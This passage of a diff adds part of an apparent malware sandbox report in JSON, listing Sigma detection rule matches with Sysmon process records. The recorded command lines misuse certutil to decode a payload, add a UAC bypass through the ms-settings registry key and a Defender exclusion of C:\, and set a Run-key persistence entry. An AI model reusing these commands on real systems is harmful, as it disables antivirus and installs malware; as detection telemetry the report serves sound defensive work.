+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "LOADER.EXE",
+                  "Description": "Mercury/32 Loader Module v4.62",
+                  "FileVersion": "4.62",
+                  "ParentCommandLine": "C:\\Users\\Public\\Libraries\\CLEAN.COM   ",
+                  "CommandLine": "C:\\Users\\Public\\Libraries\\ypbfdsfV.pif",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\Libraries\\CLEAN.COM",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\Libraries\\ypbfdsfV.pif",
+                  "Company": "David Harris"
+                }
+              },
+              {
+                "values": {
+                  "Hashes": "SHA1=AC6986C4529CF338E33A7E4034C4ADDECAC18B1A,MD5=100C56DC1DDA4A00CE29621B2E9BE469,SHA256=1DA560C9B053A8CAF0B89F42196427C7075138B619879A8508736FD8451ECAB8,IMPHASH=23630D03E910A03BFA1ED2BD0463C539",
+                  "CurrentDirectory": "C:\\Windows\\system32\\",
+                  "OriginalFileName": "Acrobat.exe",
+                  "Product": "Adobe Acrobat",
+                  "Description": "Adobe Acrobat ",
+                  "FileVersion": "24.2.20895.0",
+                  "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+                  "CommandLine": "\"C:\\Users\\Public\\Libraries\\Vfsdfbpy.PIF\" ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Windows\\explorer.exe",
+                  "IntegrityLevel": "Medium",
+                  "Image": "C:\\Users\\Public\\Libraries\\Vfsdfbpy.PIF",
+                  "Company": "Adobe Systems Incorporated"
+                }
+              },
+              {
+                "values": {
+                  "Hashes": "SHA1=452B14432FB5758B46F2897AECCD89F7C82A727D,MD5=C116D3604CEAFE7057D77FF27552C215,SHA256=7BCDC2E607ABC65EF93AFD009C3048970D9E8D1C2A18FC571562396B13EBB301,IMPHASH=DD7B5EED6607225C03249C26D14A2571",
+                  "CurrentDirectory": "C:\\Windows\\system32\\",
+                  "OriginalFileName": "LOADER.EXE",
+                  "Description": "Mercury/32 Loader Module v4.62",
+                  "FileVersion": "4.62",
+                  "ParentCommandLine": "\"C:\\Users\\Public\\Libraries\\Vfsdfbpy.PIF\" ",
+                  "CommandLine": "C:\\Users\\Public\\Libraries\\ypbfdsfV.pif",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\Libraries\\Vfsdfbpy.PIF",
+                  "IntegrityLevel": "Medium",
+                  "Image": "C:\\Users\\Public\\Libraries\\ypbfdsfV.pif",
+                  "Company": "David Harris"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "medium",
+            "rule_id": "309cda68f6a1f23a3de3d6604cd71d89098ca2472c6cfaae572a5d4375389247",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "PowerShell Core DLL Loaded By Non PowerShell Process",
+            "rule_description": "Detects loading of essential DLLs used by PowerShell by non-PowerShell process.\nDetects behavior similar to meterpreter's \"load powershell\" extension.\n",
+            "rule_author": "Tom Kern, oscd.community, Natalia Shornikova, Tim Shelton, Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)",
+            "match_context": [
+              {
+                "values": {
+                  "Hashes": "SHA1=CB75ACC679A31148A5AAA97AB47EAD827713A5BB,MD5=77084D223E5EE73E9A892D02DE41EA92,SHA256=12011808F9B3A10CF774BEF58DECB41AA39275D3C7D3A35F90F210DA40FFEB03,IMPHASH=00000000000000000000000000000000",
+                  "Product": "Microsoft (R) Windows (R) Operating System",
+                  "OriginalFileName": "System.Management.Automation.dll",
+                  "ImageLoaded": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\ace3bea481888f9f1ead5c5a6936d779\\System.Management.Automation.ni.dll",
+                  "Description": "System.Management.Automation",
+                  "SignatureStatus": "Unavailable",
+                  "EventID": "7",
+                  "FileVersion": "10.0.22621.2428",
+                  "Signed": "false",
+                  "Image": "C:\\Users\\Public\\xkn.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "medium",
+            "rule_id": "686a5b6d5e098e507256a7207e9e4a237bb378c824f67f13ee0402525833b257",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Potential Defense Evasion Via Binary Rename",
+            "rule_description": "Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.",
+            "rule_author": "Matthew Green @mgreen27, Ecco, James Pemberton @4A616D6573, oscd.community, Andreas Hunkeler (@Karneades)",
+            "match_context": [
+              {
+                "values": {
+                  "Hashes": "MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "Windows Command Processor",
+                  "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\Bruno\\Desktop\\install.bat\"",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c extrac32 /C /Y C:\\\\Windows\\\\System32\\\\certutil.exe C:\\\\Users\\\\Public\\\\kn.exe  ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\alpha.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Hashes": "MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A",
+                  "Description": "Windows Command Processor",
+                  "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\Bruno\\Desktop\\install.bat\"",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  C:\\\\Users\\\\Public\\\\kn  -decodehex -F \"C:\\Users\\Bruno\\Desktop\\install.bat\"  \"C:\\\\Users\\\\Public\\\\CLEAN.GIF\" 9    ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\alpha.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Hashes": "MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A",
+                  "Description": "Windows Command Processor",
+                  "EventID": "1",
+                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\Bruno\\Desktop\\install.bat\"",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  del /q \"C:\\Users\\Public\\kn.exe\" / A / F / Q / S  ",
+                  "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)",
+                  "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\alpha.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Hashes": "MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A",
+                  "Description": "Windows Command Processor",
+                  "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\Bruno\\Desktop\\install.bat\"",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  del /q \"C:\\Users\\Public\\CLEAN.GIF\" / A / F / Q / S  ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\alpha.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Hashes": "SHA1=13E9BB7E85FF9B08C26A440412E5CD5D296C4D35,MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "Windows Command Processor",
+                  "FileVersion": "10.0.22621.1635 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\Bruno\\Desktop\\run.bat\" \"",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c extrac32 /C /Y C:\\\\Windows\\\\System32\\\\certutil.exe C:\\\\Users\\\\Public\\\\kn.exe  ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\alpha.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "medium",
+            "rule_id": "7e416af5a1bb67fdbd2f30ae3f5da7f74583460b36546527c909c354fb5dcd00",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Powershell Defender Exclusion",
+            "rule_description": "Detects requests to exclude files, folders or processes from Antivirus scanning using PowerShell cmdlets",
+            "rule_author": "Florian Roth (Nextron Systems)",
+            "match_context": [
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Hashes": "SHA1=13E9BB7E85FF9B08C26A440412E5CD5D296C4D35,MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
+                  "Description": "Windows Command Processor",
+                  "FileVersion": "10.0.22621.1635 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "\"C:\\Windows\\sysnative\\cmd.exe\" /c \"C:\\Users\\Bruno\\AppData\\Local\\Temp\\73F9.tmp\\7409.tmp\\741A.bat C:\\Users\\Public\\Libraries\\ypbfdsfV.pif\"",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  C:\\\\Users\\\\Public\\\\xkn -WindowStyle hidden -Command \"C:\\\\Users\\\\Public\\\\alpha  /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"Add-MpPreference -ExclusionPath C:\\\"' ;    \"   ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\alpha.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "PowerShell.EXE",
+                  "Hashes": "SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",
+                  "Description": "Windows PowerShell",
+                  "FileVersion": "10.0.22621.2361 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  C:\\\\Users\\\\Public\\\\xkn -WindowStyle hidden -Command \"C:\\\\Users\\\\Public\\\\alpha  /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"Add-MpPreference -ExclusionPath C:\\\"' ;    \"   ",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"C:\\\\Users\\\\Public\\\\alpha  /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"Add-MpPreference -ExclusionPath C:\\\"' ;    \"   ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\xkn.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Hashes": "SHA1=13E9BB7E85FF9B08C26A440412E5CD5D296C4D35,MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
+                  "Description": "Windows Command Processor",
+                  "FileVersion": "10.0.22621.1635 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"C:\\\\Users\\\\Public\\\\alpha  /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"Add-MpPreference -ExclusionPath C:\\\"' ;    \"   ",
+                  "CommandLine": "\"C:\\Users\\Public\\alpha.exe\" /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d \"C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command Add-MpPreference -ExclusionPath C:\"\"",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\xkn.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\alpha.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Hashes": "SHA1=979F280B1226E064CC79020B25FB8C40D9FB0008,MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "reg.exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "Registry Console Tool",
+                  "FileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "\"C:\\Users\\Public\\alpha.exe\" /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d \"C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command Add-MpPreference -ExclusionPath C:\"\"",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\ger  add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d \"C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command Add-MpPreference -ExclusionPath C:\"\"",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\ger.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "medium",
+            "rule_id": "81f2a11aeadd681c5a2bbef5acdebbc356da424e56854a985e3c7eb0aded2fba",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Suspicious Reg Add Open Command",
+            "rule_description": "Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using DelegateExecute key",
+            "rule_author": "frack113",
+            "match_context": [
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Hashes": "SHA1=13E9BB7E85FF9B08C26A440412E5CD5D296C4D35,MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
+                  "Description": "Windows Command Processor",
+                  "FileVersion": "10.0.22621.1635 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "\"C:\\Windows\\sysnative\\cmd.exe\" /c \"C:\\Users\\Bruno\\AppData\\Local\\Temp\\73F9.tmp\\7409.tmp\\741A.bat C:\\Users\\Public\\Libraries\\ypbfdsfV.pif\"",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  C:\\\\Users\\\\Public\\\\xkn -WindowStyle hidden -Command \"C:\\\\Users\\\\Public\\\\alpha  /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"Add-MpPreference -ExclusionPath C:\\\"' ;    \"   ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\alpha.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Hashes": "SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "PowerShell.EXE",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "Windows PowerShell",
+                  "EventID": "1",
+                  "ParentCommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  C:\\\\Users\\\\Public\\\\xkn -WindowStyle hidden -Command \"C:\\\\Users\\\\Public\\\\alpha  /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"Add-MpPreference -ExclusionPath C:\\\"' ;    \"   ",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"C:\\\\Users\\\\Public\\\\alpha  /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"Add-MpPreference -ExclusionPath C:\\\"' ;    \"   ",
+                  "FileVersion": "10.0.22621.2361 (WinBuild.160101.0800)",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\xkn.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Hashes": "SHA1=13E9BB7E85FF9B08C26A440412E5CD5D296C4D35,MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "Windows Command Processor",
+                  "EventID": "1",
+                  "ParentCommandLine": "C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"C:\\\\Users\\\\Public\\\\alpha  /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"Add-MpPreference -ExclusionPath C:\\\"' ;    \"   ",
+                  "CommandLine": "\"C:\\Users\\Public\\alpha.exe\" /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d \"C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command Add-MpPreference -ExclusionPath C:\"\"",
+                  "FileVersion": "10.0.22621.1635 (WinBuild.160101.0800)",
+                  "ParentImage": "C:\\Users\\Public\\xkn.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\alpha.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Hashes": "SHA1=979F280B1226E064CC79020B25FB8C40D9FB0008,MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "reg.exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "Registry Console Tool",
+                  "EventID": "1",
+                  "ParentCommandLine": "\"C:\\Users\\Public\\alpha.exe\" /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d \"C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command Add-MpPreference -ExclusionPath C:\"\"",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\ger  add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d \"C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command Add-MpPreference -ExclusionPath C:\"\"",
+                  "FileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\ger.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "medium",
+            "rule_id": "8b5db9da5732dc549b0e8b56fe5933d7c95ed760f3ac20568ab95347ef8c5bcc",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "CurrentVersion Autorun Keys Modification",
+            "rule_description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+            "rule_author": "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)",
+            "match_context": [
+              {
+                "values": {
+                  "Details": "C:\\Users\\Public\\Vfsdfbpy.url",
+                  "EventType": "SetValue",
+                  "Image": "C:\\Users\\Public\\Libraries\\CLEAN.COM",
+                  "EventID": "13",
+                  "TargetObject": "HKU\\S-1-5-21-1070296143-2877979003-364783958-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Vfsdfbpy"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "medium",
+            "rule_id": "c79aa27a6bc774dc430e35f8d05d743b7bea3638a8776f9e8c3ba8f7188a856a",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Potentially Suspicious Volume Shadow Copy Vsstrace.dll Load",
+            "rule_description": "Detects the image load of VSS DLL by uncommon executables",
+            "rule_author": "frack113",
+            "match_context": [
+              {
+                "values": {
+                  "Hashes": "SHA1=8D487E2BBFABA73B872D7F8BA0C39ECDEFC74F3C,MD5=FA82ACE90977EC993066AFE4961613D5,SHA256=7DBEB85CB5BC21FE5161EB86878B0A90C304F798DDF5EB7E80A737165E260453,IMPHASH=1042135147BEADE386E0CAC462E8C641",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "OriginalFileName": "vsstrace.dll",
+                  "ImageLoaded": "C:\\Windows\\SysWOW64\\vsstrace.dll",
+                  "Description": "Microsoft\\xae Volume Shadow Copy Service Tracing Library",
+                  "SignatureStatus": "Valid",
+                  "EventID": "7",
+                  "FileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
+                  "Signature": "Microsoft Windows",
+                  "Signed": "true",
+                  "Image": "C:\\Users\\Public\\Libraries\\CLEAN.COM",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Hashes": "SHA1=8D487E2BBFABA73B872D7F8BA0C39ECDEFC74F3C,MD5=FA82ACE90977EC993066AFE4961613D5,SHA256=7DBEB85CB5BC21FE5161EB86878B0A90C304F798DDF5EB7E80A737165E260453,IMPHASH=1042135147BEADE386E0CAC462E8C641",
+                  "OriginalFileName": "vsstrace.dll",
+                  "ImageLoaded": "C:\\Windows\\SysWOW64\\vsstrace.dll",
+                  "Description": "Microsoft\\xae Volume Shadow Copy Service Tracing Library",
+                  "SignatureStatus": "Valid",
+                  "EventID": "7",
+                  "FileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
+                  "Signature": "Microsoft Windows",
+                  "Signed": "true",
+                  "Image": "C:\\Users\\Public\\Libraries\\Vfsdfbpy.PIF",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "medium",
+            "rule_id": "cf863dff3d564c975d28d336cb7981fcd6956e6fb9afbd2794f600b130e83171",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Windows Defender Exclusions Added - PowerShell",
+            "rule_description": "Detects modifications to the Windows Defender configuration settings using PowerShell to add exclusions",
+            "rule_author": "Tim Rauch, Elastic (idea)",
+            "match_context": [
+              {
+                "values": {
+                  "ScriptBlockText": "C:\\\\Users\\\\Public\\\\alpha  /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command Add-MpPreference -ExclusionPath C:\"' ;    ",
+                  "Path": "",
+                  "ScriptBlockId": "9d0fbb34-9ce6-4934-838c-920bb226973d",
+                  "MessageTotal": "1",
+                  "MessageNumber": "1",
+                  "EventID": "4104"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "medium",
+            "rule_id": "d6ff8dca8c8ea9fa750972dd032542746369179e3aaceccc1c3f2cc2a35f5d25",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "PSScriptPolicyTest Creation By Uncommon Process",
+            "rule_description": "Detects the creation of the \"PSScriptPolicyTest\" PowerShell script by an uncommon process. This file is usually generated by Microsoft Powershell to test against Applocker.",
+            "rule_author": "Nasreddine Bencherchali (Nextron Systems)",
+            "match_context": [
+              {
+                "values": {
+                  "Image": "C:\\Users\\Public\\xkn.exe",
+                  "EventID": "11",
+                  "TargetFilename": "C:\\Users\\Bruno\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ltpsdmw1.45z.ps1"
+                }
+              },
+              {
+                "values": {
+                  "Image": "C:\\Users\\Public\\xkn.exe",
+                  "EventID": "11",
+                  "TargetFilename": "C:\\Users\\Bruno\\AppData\\Local\\Temp\\__PSScriptPolicyTest_bwacdwra.pdg.psm1"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "low",
+            "rule_id": "1c2e4db94ca79f939e94e29c04fb3b71467fc6f5b9c31db34fcce5a2fb3b856f",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Non Interactive PowerShell Process Spawned",
+            "rule_description": "Detects non-interactive PowerShell activity by looking at the \"powershell\" process with a non-user GUI process such as \"explorer.exe\" as a parent.",
+            "rule_author": "Roberto Rodriguez @Cyb3rWard0g (rule), oscd.community (improvements)",
+            "match_context": [
+              {
+                "values": {
+                  "Hashes": "SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "PowerShell.EXE",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "Windows PowerShell",
